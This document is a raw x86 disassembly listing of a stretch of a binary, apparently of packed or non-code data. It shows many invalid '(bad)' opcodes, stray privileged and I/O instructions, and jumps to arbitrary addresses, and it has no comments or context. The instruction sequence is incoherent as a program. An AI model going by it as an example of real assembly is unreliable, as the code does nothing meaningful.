  409b34:	or     ebp,eax
  409b36:	es mov ch,0x19
  409b39:	jmp    FWORD PTR [eax]
  409b3b:	into   
  409b3c:	repz (bad) 
  409b3e:	call   0x1a78:0x1aaf2b11
  409b45:	call   FWORD PTR [edx-0x608ae5e7]
  409b4b:	sbb    DWORD PTR [edi-0x3],0x751a8000
  409b52:	xchg   edi,eax
  409b53:	cwde   
  409b54:	pop    DWORD PTR [edi]
  409b56:	jmp    edx
  409b58:	sbb    bh,bh
  409b5a:	call   0x544b02
	...
  409b73:	sub    ebx,DWORD PTR cs:[edx]
  409b76:	jne    0x409b2f
  409b78:	mov    eax,0xa1bf078f
  409b7d:	pop    ss
  409b7e:	dec    eax
  409b80:	stos   DWORD PTR es:[edi],eax
  409b81:	xchg   edi,eax
  409b82:	or     esp,DWORD PTR [edi+edx*2+0x3932fef1]
  409b89:	sbb    dh,BYTE PTR [ebp-0x61]
  409b8c:	rcr    DWORD PTR [edx+0x19e7a8fc],0x75
  409b93:	mov    bh,0x2
  409b95:	es nop
  409b97:	mov    al,ds:0x90188c2a
  409b9c:	push   ss
  409b9d:	push   ss
  409b9e:	nop
  409b9f:	cwde   
  409ba0:	test   al,0xf0
  409ba2:	sbb    bh,dl
  409ba4:	or     dl,BYTE PTR [ecx]
  409ba6:	outs   dx,BYTE PTR ds:[esi]
  409ba7:	adc    edx,DWORD PTR [esi]
  409ba9:	(bad)  
  409baa:	sbb    edx,edi
  409bac:	repnz cmc 
  409bae:	(bad)  
  409baf:	mov    al,ds:0x606fcd2a
  409bb4:	push   ss
  409bb5:	mov    al,0x46
  409bb7:	mov    bh,0x2
  409bb9:	xor    al,0x8d
  409bbb:	inc    ebx
  409bbc:	push   ss
  409bbd:	pop    esp
  409bbe:	or     BYTE PTR [ebp-0x577031fd],bh
  409bc4:	sub    dh,BYTE PTR [ebp+0x70]
  409bc7:	cmp    BYTE PTR [esi],dl
  409bc9:	mov    esi,0x3c159c8f
  409bce:	or     al,0x3f
  409bd0:	push   ds
  409bd1:	scas   eax,DWORD PTR es:[edi]
  409bd2:	sbb    DWORD PTR [eax],esp
  409bd4:	mov    bh,BYTE PTR [esp+esi*8]
	...
  409beb:	add    BYTE PTR [edi],ch
  409bed:	add    DWORD PTR [esi+0x1c159c8f],ebx
  409bf3:	or     al,0xff
  409bf5:	sub    eax,0x8a00198f
  409bfa:	sbb    al,0xf0
  409bfc:	das    
  409bfd:	add    DWORD PTR [esi-0x71],edi
  409c00:	pushf  
  409c01:	adc    eax,0x3dff0bfc
  409c06:	outs   dx,DWORD PTR ds:[esi]
  409c07:	sbb    eax,esp
  409c09:	mov    DWORD PTR [ebx+edi*8+0x4630012f],edi
  409c10:	mov    ebx,0xbb8cbc02
  409c15:	and    DWORD PTR ds:0x45ad5928,0xe7a8948f
  409c1f:	sbb    BYTE PTR [edx],bh
  409c21:	or     al,BYTE PTR [eax]
  409c23:	inc    ecx
  409c24:	loop   0x409c97
  409c26:	jmp    FWORD PTR [esi]
  409c28:	mov    esi,0x2826138f
  409c2d:	std    
  409c2e:	out    0x55,eax
  409c30:	sbb    dl,BYTE PTR [esi]
  409c32:	jmp    DWORD PTR [edx-0x4d]
  409c35:	sub    edi,DWORD PTR [ebx]
  409c37:	call   0xaccb9ee0
  409c3c:	mov    BYTE PTR [eax-0x1de16c8],al
  409c42:	call   0x434206
  409c47:	and    BYTE PTR es:[ecx],bl
  409c4a:	add    cl,ch
  409c4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c4d:	add    cl,BYTE PTR [ebp+0x24]
	...
  409c63:	add    BYTE PTR [eax],al
  409c65:	scas   eax,DWORD PTR es:[edi]
  409c66:	mov    dl,0xfe
  409c68:	pop    esp
  409c69:	push   edi
  409c6a:	adc    al,0x75
  409c6c:	stc    
  409c6d:	lahf   
  409c6e:	pop    DWORD PTR [edi]
  409c70:	rcl    DWORD PTR [edx+0x23beff14],1
  409c76:	sbb    al,BYTE PTR [ebx+0x74028f34]
  409c7c:	or     dl,BYTE PTR [ebx-0x41]
  409c7f:	cmp    ebp,DWORD PTR [eax]
  409c81:	mov    ds:0xbc9d7515,eax
  409c86:	mov    BYTE PTR [ebx-0x17],ch
  409c89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c8a:	or     eax,eax
  409c8c:	adc    al,0xa8
  409c8e:	stos   BYTE PTR es:[edi],al
  409c8f:	dec    ebp
  409c90:	vunpcklpd ymm7,ymm3,ymm6
  409c94:	hlt    
  409c95:	cwde   
  409c96:	sub    bh,BYTE PTR [ecx+0x2]
  409c99:	mov    ds:0x8f248902,eax
  409c9e:	sub    DWORD PTR [edi],eax
  409ca0:	sbb    DWORD PTR cs:[ecx],ebp
  409ca3:	add    cl,ch
  409ca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ca6:	add    al,BYTE PTR [ebx+0x740280d4]
  409cac:	icebp  
  409cad:	or     al,0x2
  409caf:	add    BYTE PTR [eax],al
  409cb1:	push   ecx
  409cb2:	mov    ebx,0xe8c275fe
  409cb7:	inc    esi
  409cb8:	xchg   ebp,eax
  409cb9:	jno    0x409cb5
  409cbb:	(bad)  
  409cbc:	jne    0x409c90
  409cbe:	cli    
  409cbf:	je     0x409ccd
  409cc1:	mov    dh,0x99
  409cc3:	xchg   esp,eax
  409cc4:	push   DWORD PTR [ecx+0x8ae8]
	...
  409cde:	jle    0x409ce0
  409ce0:	mov    eax,DWORD PTR [ebp+0x7a]
  409ce3:	jg     0x409d1d
  409ce5:	add    bl,bh
  409ce7:	adc    al,0xe8
  409ce9:	xchg   BYTE PTR [esi+0x0],bh
  409cec:	add    bh,al
  409cee:	cmp    edi,eax
  409cf0:	(bad)  
  409cf1:	dec    DWORD PTR [esi+0x0]
  409cf4:	mov    DWORD PTR [ebp+0x7a],0x3effffff
  409cfb:	aad    0x44
  409cfd:	lock add BYTE PTR ds:[eax],al
  409d01:	add    bl,ah
  409d03:	inc    ecx
  409d04:	out    dx,eax
  409d05:	push   eax
  409d06:	mov    bl,0x41
  409d08:	repz push eax
  409d0a:	ret    
  409d0b:	inc    ecx
  409d0c:	not    DWORD PTR [eax-0xf]
  409d0f:	jno    0x409d24
  409d11:	(bad)  
  409d12:	fild   DWORD PTR [esi]
  409d14:	call   0xff2cddfa
  409d19:	xor    DWORD PTR [ebx-0x128c0016],0xffffff80
  409d20:	jge    0x409d1a
  409d22:	push   cs
  409d23:	test   BYTE PTR [ebx+eax*4],ch
  409d26:	mov    ds:0x874fff2,eax
  409d2b:	cmp    DWORD PTR [ebp-0x10],0xff2083fe
  409d32:	fcomi  st,st(7)
  409d34:	(bad)  
  409d35:	jne    0x409d09
  409d37:	out    0x3c,eax
  409d39:	xchg   ebp,eax
  409d3a:	jno    0x409d27
  409d3c:	(bad)  
  409d3d:	jne    0x409ce6
  409d3f:	mov    ch,0x16
  409d41:	jne    0x409d43
	...
  409d57:	mov    bl,0xc1
  409d59:	rcl    DWORD PTR [eax+edi*4-0x488ae944],1
  409d60:	aam    0x90
  409d62:	or     edi,DWORD PTR [edi-0x5f008efc]
  409d68:	in     al,0x90
  409d6a:	test   DWORD PTR [edi-0x6f0084cb],0x7ff390f4
  409d74:	cmp    eax,0x480ff7b
  409d79:	xchg   ecx,eax
  409d7a:	out    dx,eax
  409d7b:	pop    DWORD PTR [ebp+0x7b]
  409d7e:	push   DWORD PTR [eax+0x64]
  409d81:	or     bh,bh
  409d83:	cwde   
  409d84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d85:	test   al,0xfe
  409d87:	pusha  
  409d88:	and    al,0x82
  409d8a:	jge    0x409dd7
  409d8c:	sub    DWORD PTR [edi+0x1629bd1d],ecx
  409d92:	jne    0x409d2f
  409d94:	inc    ecx
  409d95:	outs   dx,DWORD PTR ds:[esi]
  409d96:	xchg   esp,eax
  409d97:	inc    eax
  409d98:	inc    esp
  409d99:	test   eax,0x7d639ff
  409d9e:	call   0xff564ac0
  409da3:	mov    ebp,0xb3751629
  409da8:	inc    ecx
  409da9:	adc    DWORD PTR [eax+ebx*1+0x1375165c],0x71
  409db1:	es xchg edi,eax
  409db3:	or     BYTE PTR [ebp+eax*8+0xa],ch
  409db7:	stc    
  409db8:	xor    eax,DWORD PTR [eax+0xbd]
	...
  409dce:	add    BYTE PTR [eax],al
  409dd0:	stc    
  409dd1:	jnp    0x409de9
  409dd3:	pop    edi
  409dd4:	push   ecx
  409dd5:	push   edx
  409dd6:	inc    ecx
  409dd7:	adc    BYTE PTR [edi+0x24ec8af6],ah
  409ddd:	pop    ebp
  409dde:	pop    ds
  409ddf:	push   esi
  409de0:	fadd   DWORD PTR [ecx]
  409de2:	fmul   QWORD PTR [ebx]
  409de4:	mov    edi,0xc8166e6a
  409de9:	mov    BYTE PTR [edi+ecx*1-0xcab6adc],ch
  409df0:	xor    eax,0xa7048108
  409df5:	add    ch,cl
  409df7:	mov    ch,0xdf
  409df9:	aas    
  409dfa:	loope  0x409dff
  409dfc:	mov    al,ds:0x3a2be098
  409e01:	je     0x409e29
  409e03:	push   ss
  409e04:	push   0xa70420c8
  409e09:	add    ch,cl
  409e0b:	mov    dl,ch
  409e0d:	or     bh,BYTE PTR [ecx+0x10faf216]
  409e13:	ficom  WORD PTR [esi]
  409e15:	adc    bh,dh
  409e17:	mov    esp,edx
  409e19:	push   cs
  409e1a:	push   0xffffff98
  409e1c:	pop    eax
  409e1d:	add    esi,DWORD PTR [ebp+0x7]
  409e20:	and    al,0x90
  409e22:	in     al,0x2
  409e24:	aad    0x8
  409e26:	push   0xffffff97
  409e28:	dec    esp
  409e29:	or     DWORD PTR [edi+0xa],ebx
  409e2c:	inc    DWORD PTR [ebx]
  409e2e:	jmp    0xaff14536
  409e33:	inc    edx
	...
  409e48:	add    BYTE PTR [edi+0x30bf6c02],bl
  409e4e:	mov    bl,0xb5
  409e50:	(bad)
  409e54:	jae    0x409e6e
  409e56:	adc    ch,BYTE PTR [edx-0x69]
  409e59:	sbb    BYTE PTR [ebx],al
  409e5b:	adc    eax,0x1d429c00
  409e60:	or     bh,BYTE PTR [edi]
  409e62:	add    al,0xe9
  409e64:	add    esp,DWORD PTR [edi-0x60bd5050]
  409e6a:	add    ch,BYTE PTR [edx-0x69]
  409e6d:	in     al,dx
  409e6e:	pop    es
  409e6f:	add    bl,bh
  409e71:	fstp   TBYTE PTR [esi+0x45]
  409e74:	jno    0x409e89
  409e76:	pushf  
  409e77:	pop    ss
  409e78:	data16 and BYTE PTR [edx],cl
  409e7b:	call   0xff51f541
  409e80:	add    BYTE PTR fs:[edx],bl
  409e83:	push   eax
  409e84:	dec    esi
  409e85:	sub    BYTE PTR [edx],cl
  409e87:	call   0xff51d2bd
  409e8c:	jo     0x409e76
  409e8e:	and    eax,0xc729d4eb
  409e93:	neg    DWORD PTR [ecx+0x110797b3]
  409e99:	loop   0x409f0e
  409e9b:	call   FWORD PTR [esi]
  409e9d:	sbb    al,0xc7
  409e9f:	jecxz  0x409f05
  409ea1:	inc    eax
  409ea2:	sbb    DWORD PTR [eax-0x7d],edx
  409ea5:	js     0x409eb7
  409ea7:	jne    0x409e9a
  409ea9:	mov    esp,0xfe91dc
	...
  409ec2:	xchg   ebx,eax
  409ec3:	jg     0x409f0a
  409ec5:	icebp  
  409ec6:	adc    al,0x10
  409ec8:	jne    0x409eab
  409eca:	mov    WORD PTR ds:0x85bbe6fa,?
  409ed0:	jge    0x409e97
  409ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ed3:	xchg   edi,eax
  409ed4:	sbb    eax,0x50190164
  409ed9:	into   
  409eda:	sub    DWORD PTR ds:0x119f3cff,ecx
  409ee0:	jne    0x409ed3
  409ee2:	jl     0x409f44
  409ee4:	std    
  409ee5:	mov    dh,0xbb
  409ee7:	jg     0x409f2e
  409ee9:	mov    cl,0x54
  409eeb:	adc    BYTE PTR [ebp-0xf],dh
  409eee:	mov    esp,0xb39efa61
  409ef3:	test   DWORD PTR [ebp-0x6f],edi
  409ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ef7:	xchg   edi,eax
  409ef8:	or     DWORD PTR [ecx-0x5c],edx
  409efb:	add    al,BYTE PTR [eax]
  409efd:	add    dh,bh
  409eff:	push   esi
  409f00:	enter  0xf6c2,0x4
  409f04:	lea    eax,[ebp+0x56]
  409f07:	push   ebp
  409f08:	(bad)  
  409f09:	jne    0x409f55
  409f0b:	div    BYTE PTR [esp+ecx*1+0x49]
  409f0f:	add    BYTE PTR [edi],0xe8
  409f12:	ds clc 
  409f14:	(bad)  
  409f15:	dec    DWORD PTR [ebp+0x78]
  409f18:	test   DWORD PTR [eax],0xb7fad3
  409f1e:	mov    esi,0x775e0004
  409f23:	ret    
  409f24:	pop    es
	...
  409f39:	add    BYTE PTR [eax],al
  409f3b:	or     edx,DWORD PTR [ecx-0x9]
  409f3e:	push   eax
  409f3f:	leave  
  409f40:	add    BYTE PTR [edi],0xe8
  409f43:	xchg   BYTE PTR [ebp-0xbea0002],dl
  409f49:	call   0x452e49
  409f4e:	call   DWORD PTR [ebx]
  409f50:	cld    
  409f51:	out    0xe7,eax
  409f53:	int3   
  409f54:	idiv   dh
  409f56:	cmp    eax,DWORD PTR [ebx+0x0]
  409f59:	jne    0x409f60
  409f5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f5c:	(bad)  
  409f5d:	(bad)  
  409f5e:	dec    DWORD PTR [esi-0x7d]
  409f61:	jge    0x409f5f
  409f63:	inc    eax
  409f64:	jbe    0x409f89
  409f66:	lea    eax,[ebx-0x1c00b002]
  409f6c:	push   cs
  409f6d:	out    0xd,eax
  409f6f:	mov    edi,0x838dfef3
  409f74:	dec    BYTE PTR [edi-0x1]
  409f77:	jae    0x409f87
  409f79:	out    0x3a,eax
  409f7b:	push   esp
  409f7c:	hlt    
  409f7d:	dec    BYTE PTR [ebp-0xb0013d]
  409f83:	mov    bl,0xe
  409f85:	out    0x2e,eax
  409f87:	inc    esp
  409f88:	hlt    
  409f89:	dec    BYTE PTR [ebp+0x500bdea7]
  409f8f:	clc    
  409f90:	idiv   bl
  409f92:	out    0xd4,eax
  409f94:	test   BYTE PTR [ebx],dl
  409f96:	call   FWORD PTR [esi]
  409f98:	out    0x13,eax
  409f9a:	lea    ebp,[edx-0x6f]
  409f9d:	mov    bl,0xfe
	...
  409fb3:	add    BYTE PTR [edx+0x21],dl
  409fb6:	sbb    eax,esp
  409fb8:	int3   
  409fb9:	test   al,0x12
  409fbb:	mov    DWORD PTR [edx-0x43],esp
  409fbe:	add    BYTE PTR [ebp-0x41],0x49
  409fc2:	adc    dh,BYTE PTR [ebp-0x51]
  409fc5:	rcr    DWORD PTR [eax-0x5],0xb0
  409fc9:	enter  0x457c,0xbf
  409fcd:	pushf  
  409fce:	nop
  409fcf:	out    dx,eax
  409fd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fd1:	dec    ebp
  409fd2:	xchg   esi,eax
  409fd3:	sbb    BYTE PTR [edx],0xce
  409fd6:	add    esi,DWORD PTR [edx+eax*1-0x63]
  409fda:	nop
  409fdb:	out    0xa7,eax
  409fdd:	jne    0x409f89
  409fdf:	add    BYTE PTR [edx],0xf2
  409fe2:	add    esi,DWORD PTR [esi+eax*1-0x7e]
  409fe6:	mov    edx,0x1219e63b
  409feb:	jne    0x40a064
  409fed:	icebp  
  409fee:	dec    esi
  409fef:	push   0xbffe19a7
  409ff4:	sar    BYTE PTR [edi],cl
  409ff6:	fwait
  409ff7:	inc    ebp
  409ff8:	xchg   ebx,eax
  409ff9:	fiadd  DWORD PTR [ebx]
  409ffb:	call   edx
  409ffd:	sub    DWORD PTR [ebx],ebx
  409fff:	stos   BYTE PTR es:[edi],al
  40a000:	iret   
  40a001:	sbb    DWORD PTR [ebx],eax
  40a003:	or     esp,DWORD PTR [edi-0x4a]
  40a006:	add    BYTE PTR [eax-0x1f],ch
  40a009:	add    eax,0xd629ffc5
  40a00e:	adc    ebp,eax
  40a010:	rol    DWORD PTR ds:[ebx],0x0
  40a014:	lods   al,BYTE PTR ds:[esi]
  40a015:	pop    ecx
  40a016:	xchg   edi,eax
  40a017:	sub    eax,0x0
	...
  40a02c:	add    BYTE PTR [edi+0x2],bh
  40a02f:	jmp    0x9e909837
  40a034:	cwde   
  40a035:	lods   al,BYTE PTR ds:[esi]
  40a036:	sbb    bl,BYTE PTR [esi+esi*2]
  40a039:	clc    
  40a03a:	push   cs
  40a03b:	mov    ds,WORD PTR [eax-0x3f100]
  40a041:	add    BYTE PTR [esi],bh
  40a043:	pop    ebx
  40a044:	adc    ah,al
  40a046:	push   cs
  40a047:	cld    
  40a048:	pop    ds
  40a049:	fcom   DWORD PTR [esp+ebx*8+0x6673e61b]
  40a050:	adc    cl,al
  40a052:	xchg   esp,eax
  40a053:	push   eax
  40a054:	adc    bh,BYTE PTR [edx]
  40a056:	inc    BYTE PTR [eax+0x59]
  40a059:	adc    eax,0x3a124e0f
  40a05e:	adc    dl,BYTE PTR [ecx+0x46]
  40a061:	adc    cl,BYTE PTR [edi]
  40a063:	adc    bl,BYTE PTR ds:[edx]
  40a066:	pop    ds
  40a067:	inc    ecx
  40a068:	dec    esi
  40a069:	xor    cl,BYTE PTR [esi]
  40a06b:	adc    bl,BYTE PTR cs:[edx]
  40a06e:	sbb    edx,DWORD PTR [ecx]
  40a070:	push   esi
  40a071:	xor    cl,BYTE PTR [esi]
  40a073:	push   ds
  40a074:	shl    DWORD PTR ds:0xf3031090,0xfa
  40a07b:	loope  0x40a096
  40a07d:	mov    al,ds:0x6810fe87
  40a082:	push   cs
  40a083:	jb     0x40a04d
  40a085:	pop    eax
  40a086:	lods   eax,DWORD PTR ds:[esi]
  40a087:	pop    ds
  40a088:	inc    ebp
  40a089:	scas   eax,DWORD PTR es:[edi]
  40a08a:	add    dl,BYTE PTR [esi+edi*2+0x10ad8243]
	...
  40a0a5:	add    BYTE PTR [eax-0x68],cl
  40a0a8:	in     al,dx
  40a0a9:	sbb    ebp,esp
  40a0ab:	dec    edx
  40a0ac:	(bad)  
  40a0ad:	adc    DWORD PTR [edx+eax*2-0x37dc2eac],ebp
  40a0b4:	les    esi,FWORD PTR [eax+eax*2+0x20116d34]
  40a0bb:	push   cs
  40a0bc:	add    BYTE PTR [edi+esi*4],bh
  40a0bf:	or     eax,0x55acdd75
  40a0c4:	mov    fs,WORD PTR [esi+0x15bff9b6]
  40a0ca:	test   BYTE PTR [esi*2-0x468681f],0x81
  40a0d2:	push   ds
  40a0d3:	adc    bh,bh
  40a0d5:	xchg   dl,ch
  40a0d7:	dec    ebp
  40a0d8:	jne    0x40a0b3
  40a0da:	cmp    al,0xe
  40a0dc:	jbe    0xddb5ae57
  40a0e2:	mov    bh,0x97
  40a0e4:	pop    es
  40a0e5:	push   ecx
  40a0e6:	inc    ebp
  40a0e7:	push   ebp
  40a0e8:	call   FWORD PTR [esi-0x6a]
  40a0eb:	xchg   edi,eax
  40a0ec:	sti    
  40a0ed:	inc    ecx
  40a0ee:	imul   edi,DWORD PTR [esi-0x1],0x4e
  40a0f2:	ins    BYTE PTR es:[edi],dx
  40a0f3:	inc    eax
  40a0f4:	or     cl,ch
  40a0f6:	icebp  
  40a0f7:	js     0x40a0e5
  40a0f9:	push   0x36fe56ef
  40a0fe:	mov    dh,0x45
  40a100:	test   DWORD PTR [ecx-0x4b],esi
  40a103:	or     eax,0x2a4e9ff
  40a108:	add    BYTE PTR [edx+0x0],dh
	...
  40a11f:	push   0x1f290af9
  40a124:	push   es
  40a125:	adc    cl,0xa4
  40a128:	xchg   edi,eax
  40a129:	add    al,0x10
  40a12b:	xor    al,0x2
  40a12d:	add    cl,ch
  40a12f:	mov    bh,0x97
  40a131:	or     eax,DWORD PTR [ecx]
  40a133:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a134:	(bad)  
  40a135:	(bad)  
  40a136:	out    dx,al
  40a137:	push   ebx
  40a138:	dec    ebp
  40a139:	jne    0x40a131
  40a13b:	sub    al,0x33
  40a13d:	sub    al,0x28
  40a13f:	stos   DWORD PTR es:[edi],eax
  40a140:	or     eax,0x5b9ce575
  40a145:	cwde   
  40a146:	into   
  40a147:	xchg   edi,eax
  40a148:	sbb    DWORD PTR ds:0x2bcbd600,ecx
  40a14e:	inc    ecx
  40a14f:	push   cs
  40a150:	bnd je 0x40a15f
  40a153:	out    0x9e,al
  40a155:	xchg   edi,eax
  40a156:	inc    DWORD PTR [ecx-0x78]
  40a159:	test   BYTE PTR [eax+0x68fef240],bh
  40a15f:	loopne 0x40a160
  40a161:	(bad)  
  40a162:	inc    DWORD PTR [ebx+0x21fec284]
  40a168:	repnz dec edi
  40a16a:	call   0x3f353b
  40a16f:	push   ebx
  40a170:	test   dl,al
  40a172:	(bad)  
  40a173:	push   ecx
  40a174:	repnz dec edi
  40a176:	call   FWORD PTR [ebx+0x41fffdb9]
  40a17c:	jmp    0x10f07ce
  40a181:	mov    DWORD PTR [ebp+0x0],eax
	...
  40a197:	add    BYTE PTR [edx],dl
  40a199:	repz (bad) 
  40a19b:	(bad)  
  40a19c:	inc    BYTE PTR [ecx]
  40a19e:	test   bl,dh
  40a1a0:	mov    esi,0xfb8d0000
  40a1a5:	(bad)  
  40a1a8:	shr    edx,1
  40a1aa:	add    DWORD PTR [eax],edx
  40a1ac:	jle    0x40a1ae
  40a1ae:	add    BYTE PTR [ebx+eax*2-0x73],dh
  40a1b2:	inc    ecx
  40a1b3:	sub    al,0x3e
  40a1b5:	push   0x4f2ccc
  40a1ba:	call   0x40c9ea
  40a1bf:	or     edi,DWORD PTR [esi-0x816fb8c]
  40a1c5:	(bad)  
  40a1c6:	(bad)  
  40a1c7:	inc    ebx
  40a1c9:	xchg   esp,eax
  40a1ca:	sar    esi,0x41
  40a1cd:	cld    
  40a1ce:	mov    WORD PTR [edx-0x4e],es
  40a1d1:	push   esi
  40a1d2:	addr16 iret 
  40a1d4:	mov    dl,0x45
  40a1d6:	jmp    edi
  40a1d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1d9:	and    esp,DWORD PTR [ebp+0x432130ff]
  40a1df:	jne    0x40a183
  40a1e1:	xor    al,BYTE PTR [eax+0xe19a700]
  40a1e7:	jne    0x40a194
  40a1e9:	inc    ecx
  40a1ea:	mov    al,ds:0xfb5d109e
  40a1ef:	mov    edi,0xe09b1492
  40a1f4:	iret   
  40a1f5:	fiadd  DWORD PTR [ebx]
  40a1f7:	push   DWORD PTR [edx+0x25]
  40a1fa:	sbb    ecx,DWORD PTR [ecx]
	...
  40a210:	add    BYTE PTR [edi],cl
  40a212:	jge    0x40a223
  40a214:	jmp    0x40a1b3
  40a216:	out    dx,eax
  40a217:	add    edi,edi
  40a219:	pop    edx
  40a21a:	sbb    eax,0x9530fd1b
  40a21f:	push   cs
  40a220:	lea    edi,[edx]
  40a222:	pop    eax
  40a223:	push   cs
  40a224:	dec    eax
  40a226:	xchg   esi,eax
  40a227:	mov    cl,0x2b
  40a229:	push   ebp
  40a22a:	dec    ecx
  40a22b:	sbb    eax,DWORD PTR [ecx+0x1f]
  40a22e:	mov    ch,0xe
  40a230:	push   eax
  40a231:	mov    al,0x36
  40a233:	repz dec edi
  40a235:	test   al,0x4e
  40a237:	sti    
  40a238:	out    0x9d,eax
  40a23a:	retf   
  40a23b:	push   cs
  40a23c:	dec    DWORD PTR [edi-0x6f0088eb]
  40a242:	rol    dl,0x8c
  40a245:	in     eax,0x35
  40a247:	jl     0x40a1ce
  40a249:	cmp    ebp,ebx
  40a24b:	push   cs
  40a24c:	(bad)  
  40a24d:	js     0x40a2bd
  40a24f:	repz (bad) 
  40a251:	cmp    dh,BYTE PTR [ebp-0xe9700f3]
  40a257:	dec    esi
  40a258:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40a25a:	sbb    edx,edi
  40a25c:	mov    edi,0xe09b41d3
  40a261:	jg     0x40a2bd
  40a263:	add    edi,edi
  40a265:	rol    BYTE PTR [edx],cl
  40a267:	cmc    
  40a268:	sbb    esi,esi
  40a26a:	jb     0x40a24a
  40a26c:	push   cs
  40a26d:	cmp    BYTE PTR [ebp-0x63],dl
  40a270:	or     eax,0x1c390b30
	...
  40a289:	add    BYTE PTR [esi],ch
  40a28b:	jae    0x40a253
  40a28d:	push   cs
  40a28e:	ja     0x40a242
  40a290:	mov    ebp,0x491aa098
  40a295:	push   cs
  40a296:	adc    BYTE PTR [ebx],cl
  40a298:	rcl    DWORD PTR [esi],0x34
  40a29b:	or     esp,DWORD PTR [esi-0x60bfd580]
  40a2a1:	push   cs
  40a2a2:	clc    
  40a2a3:	mov    cl,0x95
  40a2a5:	pop    eax
  40a2a6:	xor    ecx,DWORD PTR [esi+ecx*4]
  40a2a9:	push   cs
  40a2aa:	call   FWORD PTR [ebx+ecx*1-0x567a58fc]
  40a2b1:	(bad)  
  40a2b2:	and    ebp,edx
  40a2b4:	jne    0x40a2c4
  40a2b6:	ror    BYTE PTR [edx],1
  40a2b8:	xor    al,0x4f
  40a2ba:	leave  
  40a2bb:	or     ah,BYTE PTR [esi+0x1b]
  40a2be:	inc    edi
  40a2bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2c0:	call   0x91955ac8
  40a2c5:	or     eax,0x46410ab0
  40a2ca:	adc    al,0xb
  40a2cc:	inc    esi
  40a2cd:	cmp    al,0x65
  40a2cf:	imul   eax
  40a2d1:	mov    eax,0x4768172d
  40a2d6:	push   edi
  40a2d7:	or     DWORD PTR [esi],ebp
  40a2d9:	push   cs
  40a2da:	pusha  
  40a2db:	and    BYTE PTR [ecx+0xd],0x80
  40a2df:	or     ch,cl
  40a2e1:	add    esp,DWORD PTR [edi-0x63379dfe]
  40a2e7:	std    
  40a2e8:	sub    BYTE PTR [edi+0x3c182a3],dl
	...
  40a302:	add    dl,bl
  40a304:	dec    DWORD PTR [edi]
  40a306:	cld    
  40a307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a308:	add    al,BYTE PTR [eax]
  40a30a:	jmp    0xa86cd73b
  40a30f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a310:	or     DWORD PTR [ebp-0xb],esi
  40a313:	pushf  
  40a314:	rcl    DWORD PTR [esi-0x7a845522],cl
  40a31a:	xchg   ecx,eax
  40a31b:	mov    eax,ds:0x5941ff09
  40a320:	add    eax,DWORD PTR [eax]
  40a322:	jmp    0xc00322c8
  40a327:	stos   BYTE PTR es:[edi],al
  40a328:	or     DWORD PTR [eax-0x3f],edx
  40a32b:	ins    BYTE PTR es:[edi],dx
  40a32c:	jne    0x40a32d
  40a32e:	scas   al,BYTE PTR es:[edi]
  40a32f:	mov    BYTE PTR [edi-0x3e],bh
  40a332:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a333:	mov    dl,0x9
  40a335:	push   eax
  40a336:	sahf   
  40a337:	push   eax
  40a338:	dec    edx
  40a339:	(bad)  
  40a33a:	xchg   esi,eax
  40a33b:	mov    ds:0xa305e51a,al
  40a340:	add    cl,BYTE PTR [ecx-0xf78894]
  40a346:	jle    0x40a32b
  40a348:	clc    
  40a349:	sub    DWORD PTR [edi+0x5c0002ab],0x50
  40a350:	inc    esp
  40a351:	(bad)  
  40a352:	data16 mov dl,0x11
  40a355:	add    bh,cl
  40a357:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a358:	add    al,BYTE PTR [eax]
  40a35a:	out    0x28,al
  40a35c:	jp     0x40a35e
  40a35e:	jmp    0x2bd61b07
  40a363:	mov    cl,0x9
  40a365:	jmp    FWORD PTR [eax+eax*1+0x0]
	...
  40a379:	add    BYTE PTR [eax],al
  40a37b:	add    BYTE PTR [ebp-0x23],ah
  40a37e:	dec    edi
  40a37f:	rcl    ecx,0xd6
  40a382:	inc    eax
  40a383:	jmp    0xe9a4ee34
  40a388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a389:	std    
  40a38a:	mov    edi,0x751da694
  40a38f:	fs clc 
  40a391:	inc    esp
  40a392:	dec    BYTE PTR [esi]
  40a394:	call   0x6755:0x7a004277
  40a39b:	iret   
  40a39c:	push   0x44
  40a39e:	jmp    edi
  40a3a0:	clc    
  40a3a1:	pop    edx
  40a3a2:	(bad)  
  40a3a3:	inc    DWORD PTR [ebp-0x3b]
  40a3a6:	je     0x40a3aa
  40a3a8:	push   ebp
  40a3a9:	pop    edx
  40a3aa:	mov    WORD PTR [ebp-0x108f4],ss
  40a3b0:	retf   
  40a3b1:	inc    ebx
  40a3b2:	sub    ecx,DWORD PTR [ecx-0x24e3d]
  40a3b8:	jmp    0xcf698429
  40a3bd:	(bad)  
  40a3be:	(bad)  
  40a3bf:	jne    0x40a3cb
  40a3c1:	in     eax,dx
  40a3c2:	cwde   
  40a3c3:	xchg   esi,eax
  40a3c4:	cmp    esi,esi
  40a3c6:	(bad)  
  40a3c7:	mov    ch,0x62
  40a3c9:	idiv   esi
  40a3cb:	(bad)  
  40a3cc:	mov    esi,0x1996e0e6
  40a3d1:	test   BYTE PTR [eax-0x108b17b],0xff
  40a3d8:	mov    esi,0x8f3c5d66
  40a3dd:	(bad)  
  40a3de:	(bad)  
  40a3df:	mov    ch,0x0
	...
  40a3f5:	mov    ?,edi
  40a3f7:	(bad)  
  40a3f8:	jmp    DWORD PTR [esi]
  40a3fa:	jb     0x40a460
  40a3fc:	add    dh,cl
  40a3fe:	or     DWORD PTR [edi+0x636cbd74],edi
  40a404:	cmp    al,0xff
  40a406:	add    al,0xff
  40a408:	mov    ch,0xe
  40a40a:	idiv   esi
  40a40c:	(bad)  
